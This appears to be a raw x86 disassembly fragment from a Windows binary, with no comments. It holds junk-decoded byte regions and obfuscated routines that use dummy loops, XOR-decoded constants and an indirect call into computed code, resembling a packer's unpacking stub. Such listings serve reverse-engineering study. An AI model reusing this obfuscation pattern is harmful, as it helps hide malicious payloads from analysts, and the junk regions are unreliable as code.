  40b0a1:	jae    0x40b0a2
  40b0a3:	test   DWORD PTR [ecx-0x6a],edx
  40b0a6:	in     eax,0xdc
  40b0a8:	inc    ebp
  40b0a9:	idiv   DWORD PTR [ebx+ebp*4-0x3e]
  40b0ad:	lods   eax,DWORD PTR ds:[esi]
  40b0ae:	xchg   edi,eax
  40b0af:	sbb    al,0x57
  40b0b1:	lods   al,BYTE PTR ds:[esi]
  40b0b2:	push   ecx
  40b0b3:	adc    al,0x4b
  40b0b5:	fisttp WORD PTR [ecx+0x60d83c94]
  40b0bb:	jl     0x40b126
  40b0bd:	inc    ecx
  40b0be:	test   DWORD PTR [edi-0x8],edi
  40b0c1:	sahf   
  40b0c2:	imul   edx,DWORD PTR [esi-0x3d],0x33
  40b0c6:	sub    BYTE PTR [eax+0x34],0x5
  40b0ca:	mov    esi,0x374457b5
  40b0cf:	js     0x40b0aa
  40b0d1:	fadd   DWORD PTR [bx-0xa3a]
  40b0d6:	data16 idiv BYTE PTR [ebx]
  40b0d9:	sbb    al,0x89
  40b0db:	popa   
  40b0dc:	scas   al,BYTE PTR es:[edi]
  40b0dd:	jmp    0x40b0e2
  40b0df:	popa   
  40b0e0:	fild   WORD PTR [eax]
  40b0e2:	fcom   DWORD PTR [eax]
  40b0e4:	dec    esp
  40b0e5:	daa    
  40b0e6:	ds nop
  40b0e8:	aaa    
  40b0e9:	xor    ch,ah
  40b0eb:	push   es
  40b0ec:	rcr    edi,0x9f
  40b0ef:	retf   0x231c
  40b0f2:	add    dh,BYTE PTR [ebx+0x15]
  40b0f5:	cpuid  
  40b0f7:	mov    eax,0xa6d2cb6d
  40b0fc:	mov    DWORD PTR [edx],edi
  40b0fe:	outs   dx,DWORD PTR ds:[esi]
  40b0ff:	(bad)  
  40b100:	push   ds
  40b101:	and    BYTE PTR [eax+esi*2-0x66bc140f],bh
  40b108:	or     esp,DWORD PTR [edi+0x51463be]
  40b10e:	push   esi
  40b10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b110:	lods   al,BYTE PTR ds:[esi]
  40b111:	pop    eax
  40b112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b113:	ds push edi
  40b115:	add    dh,0xde
  40b118:	pop    esi
  40b119:	ret    0x11
  40b11c:	ja     0x40b0e1
  40b11e:	mov    al,ds:0xbf8c26ad
  40b123:	mov    edi,0x370d7e50
  40b128:	and    BYTE PTR [ecx+0x54],0x80
  40b12c:	jle    0x40b189
  40b12e:	sar    DWORD PTR [edx-0x7a],0x67
  40b132:	mov    ds:0x71b7113d,eax
  40b137:	push   ebp
  40b138:	inc    ecx
  40b139:	fs xchg ebp,eax
  40b13b:	jae    0x40b139
  40b13d:	pop    edi
  40b13e:	push   ss
  40b13f:	add    bl,BYTE PTR [ecx-0xa143037]
  40b145:	sbb    al,0xa7
  40b147:	(bad)  [ecx-0x44]
  40b14a:	cld    
  40b14b:	fs jae 0xf03790dc
  40b152:	imul   eax,DWORD PTR [ecx-0x7a898a0a],0xffffffa3
  40b159:	or     BYTE PTR [edi],0xaa
  40b15c:	xchg   ecx,eax
  40b15d:	xchg   ah,dh
  40b15f:	retf   0x32ed
  40b162:	jns    0x40b12f
  40b164:	popf   
  40b165:	pop    esp
  40b166:	arpl   WORD PTR [ecx],bx
  40b168:	fild   QWORD PTR [edi]
  40b16a:	push   es
  40b16b:	push   ds
  40b16c:	in     eax,dx
  40b16d:	ins    DWORD PTR es:[edi],dx
  40b16e:	sub    BYTE PTR [esi+0x6c352bfe],0x15
  40b175:	cli    
  40b176:	(bad)  
  40b178:	add    ebp,DWORD PTR [ebx-0x6d]
  40b17b:	sbb    al,0xd3
  40b17d:	pop    ebx
  40b17e:	test   DWORD PTR [eax],edx
  40b180:	js     0x40b13d
  40b182:	mov    ch,BYTE PTR [esi]
  40b184:	fidivr DWORD PTR cs:[eax]
  40b187:	inc    ebx
  40b188:	outs   dx,BYTE PTR ds:[esi]
  40b189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b18a:	(bad)  
  40b18b:	mov    ebp,0xf216c1a5
  40b190:	inc    edx
  40b191:	sbb    al,0x3f
  40b193:	std    
  40b194:	add    BYTE PTR [edi+0x18458b94],ah
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41d46c
  40b1bd:	sub    ecx,DWORD PTR ds:0x428010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff1e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d46c
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d4f0
  40b34b:	mov    esi,DWORD PTR ds:0x41d4e8
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d4e8,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d4e8
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d4e8
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d4e8
  40b3aa:	mov    ds:0x41d4f0,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ff71
  40b3fa:	push   0x41ff5b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d46c
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d578
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d28c
  40b4c0:	mov    esi,DWORD PTR ds:0x41d2a8
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x41ffff
  40b51b:	mov    esi,DWORD PTR ds:0x41d2a4
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x41ffe7
  40b559:	mov    ecx,DWORD PTR ds:0x41d270
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d2e8
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d544
  40b774:	push   DWORD PTR ds:0x41d2f0
  40b77a:	push   DWORD PTR ds:0x41d524
  40b780:	push   DWORD PTR ds:0x41d598
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d4e8
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d2e4
  40b812:	mov    edx,DWORD PTR ds:0x41d270
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d46c
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d2bc
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xd3289f5c
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x23]
  40bac3:	mov    esp,0xf732563e
  40bac8:	pop    ecx
  40bac9:	xor    DWORD PTR [ecx-0x4e833f0d],edi
  40bacf:	xchg   ebp,eax
  40bad0:	push   0xb04b4340
  40bad5:	das    
  40bad6:	jne    0x40ba5f
  40bad8:	dec    eax
  40bad9:	dec    cl
  40badb:	test   eax,0x9235cdbb
  40bae0:	add    BYTE PTR [edi+0x7c02d656],dl
  40bae6:	rcr    DWORD PTR [edi-0x40d4773b],0x62
  40baed:	cwde   
  40baee:	pop    ss
  40baef:	mov    ?,esi
  40baf1:	outs   dx,BYTE PTR ds:[esi]
  40baf2:	shl    DWORD PTR [esp+edi*2],0x9e
  40baf6:	pop    ds
  40baf7:	jns    0x40bb66
  40baf9:	lods   eax,DWORD PTR ds:[esi]
  40bafa:	xchg   edi,eax
  40bafb:	cld    
  40bafc:	push   ebx
  40bafd:	je     0x40bb56
  40baff:	out    dx,eax
  40bb00:	mov    ds:0xb2b25526,al
